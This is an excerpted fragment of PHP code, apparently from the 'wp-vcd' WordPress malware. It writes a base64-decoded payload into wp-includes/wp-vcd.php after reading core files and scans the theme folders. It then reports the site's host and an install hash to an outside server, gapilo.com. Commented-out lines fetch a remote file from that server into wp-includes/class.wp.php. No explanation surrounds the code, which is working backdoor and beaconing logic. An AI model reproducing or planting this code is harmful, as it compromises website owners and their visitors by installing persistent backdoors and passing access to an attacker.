		...
		if ( ($file = file_get_contents($path . '/wp-includes/post.php')) && (file_put_contents($path . '/wp-includes/wp-vcd.php', base64_decode($GLOBALS['WP_CD_CODE']))) )
			{
				if (strpos($file, 'wp-vcd') === false) {
					...
					//@file_put_contents($path . '/wp-includes/class.wp.php', file_get_contents('http://www.gapilo.com/admin.txt'));
				}
			}
	}
			...
			if ($list = scandir( $themes ))
				{
					...
					if ($ping) {
						$content = @file_get_contents('http://www.gapilo.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
						//@file_put_contents(ABSPATH . 'wp-includes/class.wp.php', file_get_contents('http://www.gapilo.com/admin.txt'));
